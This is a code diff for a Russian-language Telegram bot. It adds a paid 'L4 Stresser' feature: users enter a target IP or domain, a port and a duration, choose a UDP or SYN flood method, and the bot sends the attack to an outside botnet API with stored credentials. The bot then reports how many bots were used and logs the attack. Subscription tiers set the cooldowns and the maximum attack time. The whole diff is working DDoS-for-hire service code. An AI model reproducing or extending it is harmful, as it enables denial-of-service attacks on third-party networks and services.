@@ -118,6 +118,7 @@ last_used_botnet2 = {}
 last_used_bot_snos = {}
 last_used_bot_snos_fast = {}  # КД 5 минут для "своих" ботов (с капчей)
 last_used_stress = {}
+last_used_l4 = {}
 last_used_channel = {}
 last_used_aureport = {}
 last_used_tida = {}
@@ -350,6 +351,11 @@ class WaitMirrorTokenFSM(StatesGroup):
 
 class WaitStressFSM(StatesGroup):
 	link = State()
+
+class WaitL4FSM(StatesGroup):
+	target   = State()   # IP или домен
+	port     = State()   # порт
+	time_dur = State()   # длительность
 
 class WaitChannelFSM(StatesGroup):
 	link = State()
@@ -3426,6 +3432,44 @@ async def handle_callback(call: types.CallbackQuery, bot_instance, dp_instance, 
 			await dp_instance.current_state(chat=uid, user=uid).set_state(WaitStressFSM.link.state)
 			await dp_instance.current_state(user=uid).update_data(_bot_token=_instance_token)
 
+		# ─── L4 Стрессер ──────────────────────────────────────────────────────
+		elif d == 'l4_method':
+			if bot_off():
+				await bot_instance.edit_message_caption(call.message.chat.id, call.message.message_id, caption=t('err_bot_off', _user_lang), parse_mode="MarkdownV2", reply_markup=panel_back_markup); return
+			if sub_expired():
+				await bot_instance.edit_message_caption(call.message.chat.id, call.message.message_id, caption=t('err_pay', _user_lang), parse_mode="MarkdownV2", reply_markup=panel_back_markup); return
+			cd_minutes = 15 if premium == 1 else 60
+			if uid not in admins and uid not in no_kd and uid in last_used_l4 and (now_msk() - last_used_l4[uid]) < timedelta(minutes=cd_minutes):
+				rem = timedelta(minutes=cd_minutes) - (now_msk() - last_used_l4[uid])
+				m_left = rem.seconds // 60
+				s_left = rem.seconds % 60
+				await bot_instance.answer_callback_query(call.id, f"⏳ Подождите ещё {m_left}м {s_left}с", show_alert=True)
+				return
+			max_time = 300 if premium == 1 else 150
+			await bot_instance.send_message(
+				call.message.chat.id,
+				f"⚡ *L4 Стрессер*\n\n"
+				f"{'👑 *Premium* — макс. *300 сек*, кд *15 мин*' if premium == 1 else '🔹 *Regular* — макс. *150 сек*, кд *1 час*'}\n\n"
+				f"*Введите IP адрес или домен цели:*\n"
+				f"Пример: `1.2.3.4` или `example.com`",
+				parse_mode="Markdown"
+			)
+			await dp_instance.current_state(chat=uid, user=uid).set_state(WaitL4FSM.target.state)
+			await dp_instance.current_state(user=uid).update_data(_bot_token=_instance_token, _premium=premium, _max_time=max_time)
+			await bot_instance.answer_callback_query(call.id)
+
+		elif d.startswith('l4_m_'):
+			method = d[5:]
+			fsm_state = dp_instance.current_state(user=uid)
+			await fsm_state.update_data(_l4_method=method)
+			await bot_instance.send_message(
+				call.message.chat.id,
+				f"✅ *Метод:* `{method.upper()}`\n\n*Введите порт цели* (0 = случайный):\nПример: `80`, `443`, `25565`, `0`",
+				parse_mode="Markdown"
+			)
+			await dp_instance.current_state(chat=uid, user=uid).set_state(WaitL4FSM.port.state)
+			await bot_instance.answer_callback_query(call.id)
+
 	except Exception as e:
 		print(f"callback_inline: {e}")
 
@@ -4576,6 +4620,191 @@ async def profile_step1(message: types.Message, state: FSMContext):
 				await session.close()
 			except Exception:
 				pass
+
+
+@dp.message_handler(state=WaitL4FSM.target)
+async def l4_step_target(message: types.Message, state: FSMContext):
+	import socket as _socket
+	import base64 as _base64
+	uid = message.from_user.id
+	lang = await db.get_lang(uid)
+	fsm_data = await state.get_data()
+	_bot_token = fsm_data.get('_bot_token')
+	_bot = Bot(token=_bot_token) if (_bot_token and _bot_token != config.TOKEN) else bot
+	raw = message.text.strip()
+
+	# Резолвим домен в IP
+	ip = None
+	if raw.replace('.', '').replace(':', '').isdigit() or _is_valid_ip(raw):
+		ip = raw
+	else:
+		try:
+			result = await asyncio.get_event_loop().run_in_executor(None, lambda: _socket.getaddrinfo(raw, None))
+			ip = result[0][4][0]
+		except Exception:
+			await _bot.send_message(uid, "❌ *Не удалось определить IP для домена*\n\nПроверьте домен и попробуйте снова.", parse_mode="Markdown")
+			return
+
+	await state.update_data(_l4_ip=ip, _l4_domain=raw)
+
+	# Получаем методы из Lotus API
+	methods = {}
+	try:
+		_auth = _base64.b64encode(f"{config.LOTUS_LOGIN}:{config.LOTUS_PASS}".encode()).decode()
+		async with aiohttp.ClientSession() as s:
+			async with s.get(
+				"https://api.fragment.bond/api/methods",
+				headers={"Authorization": f"Basic {_auth}"},
+				timeout=aiohttp.ClientTimeout(total=8)
+			) as resp:
+				if resp.status == 200:
+					data = await resp.json()
+					methods = data.get("methods", {})
+	except Exception as e:
+		print(f"[L4] methods fetch error: {e}")
+
+	if not methods:
+		methods = {"udp": "UDP флуд", "syn": "SYN флуд"}
+
+	domain_str = f" (`{raw}`)" if raw != ip else ""
+	mkp = types.InlineKeyboardMarkup(row_width=2)
+	for m_name in methods:
+		mkp.add(types.InlineKeyboardButton(f"⚡ {m_name.upper()}", callback_data=f"l4_m_{m_name}"))
+
+	await _bot.send_message(
+		uid,
+		f"🎯 *Цель:* `{ip}`{domain_str}\n\n*Выберите метод атаки:*",
+		parse_mode="Markdown",
+		reply_markup=mkp
+	)
+
+
+def _is_valid_ip(s: str) -> bool:
+	import socket as _sock
+	try:
+		_sock.inet_aton(s)
+		return True
+	except Exception:
+		return False
+
+
+@dp.message_handler(state=WaitL4FSM.port)
+async def l4_step_port(message: types.Message, state: FSMContext):
+	uid = message.from_user.id
+	fsm_data = await state.get_data()
+	_bot_token = fsm_data.get('_bot_token')
+	_bot = Bot(token=_bot_token) if (_bot_token and _bot_token != config.TOKEN) else bot
+	raw = message.text.strip()
+
+	try:
+		port = int(raw)
+		if port < 0 or port > 65535:
+			raise ValueError
+	except ValueError:
+		await _bot.send_message(uid, "❌ Неверный порт. Введите число от 0 до 65535:", parse_mode="Markdown")
+		return
+
+	await state.update_data(_l4_port=port)
+	max_time = fsm_data.get('_max_time', 150)
+	port_str = str(port) if port > 0 else "случайный"
+	await _bot.send_message(
+		uid,
+		f"✅ *Порт:* `{port_str}`\n\n*Введите время атаки в секундах* (макс. {max_time}):",
+		parse_mode="Markdown"
+	)
+	await state.set_state(WaitL4FSM.time_dur.state)
+
+
+@dp.message_handler(state=WaitL4FSM.time_dur)
+async def l4_step_time(message: types.Message, state: FSMContext):
+	import base64 as _base64
+	uid = message.from_user.id
+	username = message.from_user.username or "None"
+	lang = await db.get_lang(uid)
+	fsm_data = await state.get_data()
+	_bot_token = fsm_data.get('_bot_token')
+	_bot = Bot(token=_bot_token) if (_bot_token and _bot_token != config.TOKEN) else bot
+	max_time = fsm_data.get('_max_time', 150)
+	raw = message.text.strip()
+
+	try:
+		duration = int(raw)
+		if duration < 1 or duration > max_time:
+			raise ValueError
+	except ValueError:
+		await _bot.send_message(uid, f"❌ Введите число от 1 до {max_time}:", parse_mode="Markdown")
+		return
+
+	await state.finish()
+
+	ip      = fsm_data.get('_l4_ip', '')
+	domain  = fsm_data.get('_l4_domain', ip)
+	method  = fsm_data.get('_l4_method', 'udp')
+	port    = fsm_data.get('_l4_port', 0)
+
+	domain_str = f" (`{domain}`)" if domain != ip else ""
+	port_str   = str(port) if port > 0 else "случайный"
+
+	await _bot.send_message(
+		uid,
+		f"⚡ *Запускаю атаку...*\n\n"
+		f"🎯 Цель: `{ip}`{domain_str}\n"
+		f"⚙️ Метод: `{method.upper()}`\n"
+		f"🔌 Порт: `{port_str}`\n"
+		f"⏱ Время: `{duration} сек`",
+		parse_mode="Markdown"
+	)
+
+	try:
+		_auth = _base64.b64encode(f"{config.LOTUS_LOGIN}:{config.LOTUS_PASS}".encode()).decode()
+		params = {"target": ip, "time": str(duration), "method": method}
+		if port > 0:
+			params["port"] = str(port)
+		async with aiohttp.ClientSession() as s:
+			async with s.post(
+				"https://api.fragment.bond/api",
+				headers={"Authorization": f"Basic {_auth}"},
+				data=params,
+				timeout=aiohttp.ClientTimeout(total=15)
+			) as resp:
+				data = await resp.json()
+
+		if data.get("status") == "success":
+			bots_count = data.get("bots", "?")
+			last_used_l4[uid] = now_msk()
+			try: await db.log_attack(uid, ip, "l4")
+			except Exception: pass
+			await _bot.send_message(
+				uid,
+				f"✅ *Атака запущена!*\n\n"
+				f"🤖 Ботов: `{bots_count}`\n"
+				f"🎯 Цель: `{ip}:{port_str}`\n"
+				f"⚙️ Метод: `{method.upper()}`\n"
+				f"⏱ Время: `{duration} сек`",
+				parse_mode="Markdown",
+				reply_markup=keyboards.get_main_menu_markup(lang)
+			)
+			_log_uid, _log_uname = await _log_display(uid, username)
+			try:
+				await bot.send_message(
+					bot_logs,
+					f"⚡ *L4 Атака*\n"
+					f"🎯 `{ip}` порт `{port_str}` метод `{method.upper()}` {duration}с\n"
+					f"👤 {_log_uid} (*@{_log_uname}*) [{'prem' if fsm_data.get('_premium') else 'reg'}]",
+					parse_mode="Markdown"
+				)
+			except Exception: pass
+		else:
+			err_msg = data.get("message", "Неизвестная ошибка")
+			await _bot.send_message(
+				uid,
+				f"❌ *Ошибка:* {err_msg}",
+				parse_mode="Markdown",
+				reply_markup=keyboards.get_main_menu_markup(lang)
+			)
+	except Exception as e:
+		print(f"[L4] launch error: {e}")
+		await _bot.send_message(uid, f"❌ *Ошибка соединения с API*", parse_mode="Markdown", reply_markup=keyboards.get_main_menu_markup(lang))
 
 
 @dp.message_handler(state=WaitStressFSM.link)
